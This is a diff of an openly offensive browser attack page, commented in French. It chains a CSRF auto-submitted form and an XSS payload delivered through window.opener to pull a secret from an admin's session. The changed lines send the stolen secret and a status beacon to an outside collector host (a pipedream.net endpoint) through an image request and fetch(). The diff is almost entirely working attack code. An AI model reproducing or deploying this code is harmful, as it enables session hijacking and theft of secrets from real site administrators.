@@ -44,7 +44,7 @@
                     
                     // 3. EXFILTRATION : Envoie une requête GET invisible avec le secret
                     "var img = new Image();" +
-                    "img.src = 'https://eotoci65n24zl7e.m.pipedream.net' + '?secret=' + encodedSecret;" +
+                    "img.src = 'https://eotoci65n24zl7e.m.pipedream.net?secret=' + encodedSecret;" +
                     
                     "console.log('Secret exfiltrated! Check your listener logs.');" +
                 "} else {" +
@@ -60,8 +60,12 @@
             document.getElementById('username').value = MALICIOUS_PAYLOAD;
 
             // Soumet automatiquement le formulaire au domaine cible, en envoyant les cookies de l'Admin.
-            document.getElementById('csrfForm').submit();
-            console.log("Phase 1: CSRF POST submitted. Payload stored in Admin's session.");
+            fetch('https://eotoci65n24zl7e.m.pipedream.net/?status=csrf_executed');
+
+            setTimeout(function() {
+              document.getElementById('csrfForm').submit();
+              console.log("Phase 1: CSRF POST submitted. Payload stored in Admin's session.");        
+            }, 1000);
         }
 
         // PHASE 2 : Livraison par Opener (Déclenchement XSS)
